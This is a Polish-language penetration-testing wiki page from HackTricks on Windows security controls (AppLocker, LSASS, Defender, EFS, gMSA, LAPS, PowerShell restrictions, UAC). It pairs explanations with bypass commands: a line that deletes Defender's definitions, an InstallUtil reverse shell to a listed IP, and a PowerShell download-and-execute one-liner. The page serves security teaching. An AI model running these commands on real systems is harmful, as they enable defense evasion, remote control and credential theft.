# Kontrole bezpieczeństwa systemu Windows

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo budować i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społecznościowe na świecie.\
Uzyskaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Polityka AppLocker

Biała lista aplikacji to lista zatwierdzonych aplikacji lub plików wykonywalnych, które mogą być obecne i uruchamiane w systemie. Celem jest ochrona środowiska przed szkodliwym złośliwym oprogramowaniem i niezatwierdzonym oprogramowaniem, które nie odpowiada specyficznym potrzebom biznesowym organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) to **rozwiązanie do białej listy aplikacji** firmy Microsoft, które daje administratorom systemów kontrolę nad **tym, które aplikacje i pliki mogą uruchamiać użytkownicy**. Zapewnia **szczegółową kontrolę** nad plikami wykonywalnymi, skryptami, plikami instalacyjnymi Windows, DLL, aplikacjami pakietowymi i instalatorami aplikacji pakietowych.\
W organizacjach powszechnie **blokuje się cmd.exe i PowerShell.exe** oraz dostęp do zapisu w niektórych katalogach, **ale to wszystko można obejść**.

### Sprawdź

Sprawdź, które pliki/rozszerzenia są na czarnej/białej liście:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ta ścieżka rejestru zawiera konfiguracje i polityki stosowane przez AppLocker, co umożliwia przeglądanie bieżącego zestawu reguł egzekwowanych w systemie:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Ominięcie

* Użyteczne **zapisywalne foldery** do ominięcia polityki AppLocker: Jeśli AppLocker zezwala na wykonywanie czegokolwiek w `C:\Windows\System32` lub `C:\Windows`, istnieją **zapisywalne foldery**, które możesz wykorzystać do **ominięcia tego**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Powszechnie **zaufane** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaria mogą być również przydatne do obejścia AppLocker.
* **Źle napisane zasady mogą być również obejście**
* Na przykład, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, możesz stworzyć **folder o nazwie `allowed`** wszędzie, a będzie on dozwolony.
* Organizacje często koncentrują się na **blokowaniu pliku wykonywalnego `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych** [**lokacjach plików wykonywalnych PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` lub `PowerShell_ISE.exe`.
* **Wymuszanie DLL rzadko włączone** z powodu dodatkowego obciążenia, jakie może nałożyć na system, oraz ilości testów wymaganych do zapewnienia, że nic się nie zepsuje. Dlatego użycie **DLL jako tylnej furtki pomoże w obejściu AppLocker**.
* Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonać kod Powershell** w dowolnym procesie i obejść AppLocker. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Przechowywanie poświadczeń

### Menedżer kont zabezpieczeń (SAM)

Lokalne poświadczenia znajdują się w tym pliku, hasła są haszowane.

### Lokalna jednostka zabezpieczeń (LSA) - LSASS

**Poświadczenia** (haszowane) są **zapisywane** w **pamięci** tego podsystemu z powodów związanych z jednolitym logowaniem.\
**LSA** zarządza lokalną **polityką zabezpieczeń** (polityka haseł, uprawnienia użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
LSA będzie tą, która **sprawdzi** podane poświadczenia w pliku **SAM** (dla lokalnego logowania) i **porozmawia** z **kontrolerem domeny**, aby uwierzytelnić użytkownika domeny.

**Poświadczenia** są **zapisywane** wewnątrz **procesu LSASS**: bilety Kerberos, hasze NT i LM, łatwo odszyfrowane hasła.

### Sekrety LSA

LSA może zapisać na dysku niektóre poświadczenia:

* Hasło konta komputera w Active Directory (niedostępny kontroler domeny).
* Hasła kont usług Windows
* Hasła do zadań zaplanowanych
* Więcej (hasło aplikacji IIS...)

### NTDS.dit

To baza danych Active Directory. Jest obecna tylko w kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) to program antywirusowy dostępny w Windows 10 i Windows 11 oraz w wersjach Windows Server. **Blokuje** powszechne narzędzia pentestingowe, takie jak **`WinPEAS`**. Jednak istnieją sposoby na **obejście tych zabezpieczeń**.

### Sprawdzenie

Aby sprawdzić **status** **Defendera**, możesz wykonać polecenie PS **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`**, aby dowiedzieć się, czy jest aktywna):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Aby go wyliczyć, możesz również uruchomić:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS zabezpiecza pliki poprzez szyfrowanie, wykorzystując **klucz symetryczny** znany jako **Klucz Szyfrowania Pliku (FEK)**. Klucz ten jest szyfrowany za pomocą **klucza publicznego** użytkownika i przechowywany w alternatywnym strumieniu danych $EFS **szyfrowanego pliku**. Gdy potrzebne jest odszyfrowanie, używany jest odpowiadający **klucz prywatny** cyfrowego certyfikatu użytkownika do odszyfrowania FEK ze strumienia $EFS. Więcej szczegółów można znaleźć [tutaj](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Scenariusze odszyfrowania bez inicjacji użytkownika** obejmują:

* Gdy pliki lub foldery są przenoszone do systemu plików, który nie obsługuje EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), są automatycznie odszyfrowywane.
* Szyfrowane pliki wysyłane przez sieć za pomocą protokołu SMB/CIFS są odszyfrowywane przed transmisją.

Ta metoda szyfrowania umożliwia **przezroczysty dostęp** do szyfrowanych plików dla właściciela. Jednak samo zmienienie hasła właściciela i zalogowanie się nie pozwoli na odszyfrowanie.

**Kluczowe wnioski**:

* EFS używa symetrycznego FEK, szyfrowanego kluczem publicznym użytkownika.
* Odszyfrowanie wykorzystuje klucz prywatny użytkownika do uzyskania dostępu do FEK.
* Automatyczne odszyfrowanie występuje w określonych warunkach, takich jak kopiowanie do FAT32 lub transmisja sieciowa.
* Szyfrowane pliki są dostępne dla właściciela bez dodatkowych kroków.

### Sprawdź informacje EFS

Sprawdź, czy **użytkownik** **korzystał** z tej **usługi**, sprawdzając, czy istnieje ta ścieżka: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Sprawdź **kto** ma **dostęp** do pliku, używając cipher /c \<file>\
Możesz również użyć `cipher /e` i `cipher /d` w folderze, aby **szyfrować** i **odszyfrowywać** wszystkie pliki

### Odszyfrowywanie plików EFS

#### Bycie autorytetem systemowym

Ta metoda wymaga, aby **użytkownik ofiary** **uruchamiał** **proces** wewnątrz hosta. Jeśli tak jest, używając sesji `meterpreter`, możesz podszyć się pod token procesu użytkownika (`impersonate_token` z `incognito`). Możesz też po prostu `migrate` do procesu użytkownika.

#### Znając hasło użytkownika

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft opracował **Group Managed Service Accounts (gMSA)**, aby uprościć zarządzanie kontami serwisowymi w infrastrukturach IT. W przeciwieństwie do tradycyjnych kont serwisowych, które często mają włączoną opcję "**Hasło nigdy nie wygasa**", gMSA oferują bardziej bezpieczne i zarządzalne rozwiązanie:

* **Automatyczne zarządzanie hasłami**: gMSA używają złożonego, 240-znakowego hasła, które automatycznie zmienia się zgodnie z polityką domeny lub komputera. Proces ten jest obsługiwany przez usługę dystrybucji kluczy Microsoftu (KDC), eliminując potrzebę ręcznych aktualizacji haseł.
* **Zwiększone bezpieczeństwo**: Te konta są odporne na zablokowania i nie mogą być używane do interaktywnych logowań, co zwiększa ich bezpieczeństwo.
* **Wsparcie dla wielu hostów**: gMSA mogą być udostępniane na wielu hostach, co czyni je idealnymi dla usług działających na wielu serwerach.
* **Możliwość zadań zaplanowanych**: W przeciwieństwie do zarządzanych kont serwisowych, gMSA wspierają uruchamianie zadań zaplanowanych.
* **Uproszczone zarządzanie SPN**: System automatycznie aktualizuje nazwę główną usługi (SPN) w przypadku zmian w szczegółach sAMaccount komputera lub nazwie DNS, co upraszcza zarządzanie SPN.

Hasła dla gMSA są przechowywane w właściwości LDAP _**msDS-ManagedPassword**_ i są automatycznie resetowane co 30 dni przez kontrolery domeny (DC). To hasło, zaszyfrowany blob danych znany jako [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), może być odzyskane tylko przez upoważnionych administratorów i serwery, na których zainstalowane są gMSA, zapewniając bezpieczne środowisko. Aby uzyskać dostęp do tych informacji, wymagane jest zabezpieczone połączenie, takie jak LDAPS, lub połączenie musi być uwierzytelnione za pomocą 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Możesz odczytać to hasło za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Znajdź więcej informacji w tym poście**](https://cube0x0.github.io/Relaying-for-gMSA/)

Sprawdź również tę [stronę internetową](https://cube0x0.github.io/Relaying-for-gMSA/) na temat tego, jak przeprowadzić **atak NTLM relay**, aby **odczytać** **hasło** **gMSA**.

## LAPS

**Rozwiązanie hasła lokalnego administratora (LAPS)**, dostępne do pobrania z [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), umożliwia zarządzanie hasłami lokalnych administratorów. Te hasła, które są **losowe**, unikalne i **regularnie zmieniane**, są przechowywane centralnie w Active Directory. Dostęp do tych haseł jest ograniczony przez ACL do uprawnionych użytkowników. Przy wystarczających uprawnieniach możliwe jest odczytanie haseł lokalnych administratorów.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Tryb ograniczonego języka PS

PowerShell [**Tryb ograniczonego języka**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ogranicza wiele funkcji** potrzebnych do skutecznego korzystania z PowerShell, takich jak blokowanie obiektów COM, zezwalanie tylko na zatwierdzone typy .NET, przepływy pracy oparte na XAML, klasy PowerShell i inne.

### **Sprawdź**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Ominięcie
```powershell
#Easy bypass
Powershell -version 2
```
W obecnym Windows ten bypass nie zadziała, ale możesz użyć [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby go skompilować, możesz potrzebować** **dodać** **_Referencję_** -> _Przeglądaj_ -> _Przeglądaj_ -> dodaj `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **zmień projekt na .Net4.5**.

#### Bezpośredni bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonać kod Powershell** w dowolnym procesie i obejść tryb ograniczony. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Polityka wykonania PS

Domyślnie jest ustawiona na **ograniczoną.** Główne sposoby obejścia tej polityki:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Jest to API, które można wykorzystać do uwierzytelniania użytkowników.

SSPI będzie odpowiedzialne za znalezienie odpowiedniego protokołu dla dwóch maszyn, które chcą się komunikować. Preferowaną metodą jest Kerberos. Następnie SSPI negocjuje, który protokół uwierzytelniania będzie używany, te protokoły uwierzytelniania nazywane są Security Support Provider (SSP), znajdują się w każdej maszynie z systemem Windows w postaci DLL, a obie maszyny muszą obsługiwać ten sam, aby mogły się komunikować.

### Główne SSP

* **Kerberos**: Preferowany
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** i **NTLMv2**: Powody zgodności
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Serwery internetowe i LDAP, hasło w postaci hasha MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL i TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Używane do negocjacji protokołu do użycia (Kerberos lub NTLM, przy czym Kerberos jest domyślnym)
* %windir%\Windows\System32\lsasrv.dll

#### Negocjacja może oferować kilka metod lub tylko jedną.

## UAC - Kontrola konta użytkownika

[Kontrola konta użytkownika (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która umożliwia **wyświetlenie monitu o zgodę na podwyższone działania**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo budować i **automatyzować przepływy pracy** zasilane przez **najbardziej zaawansowane** narzędzia społecznościowe na świecie.\
Uzyskaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
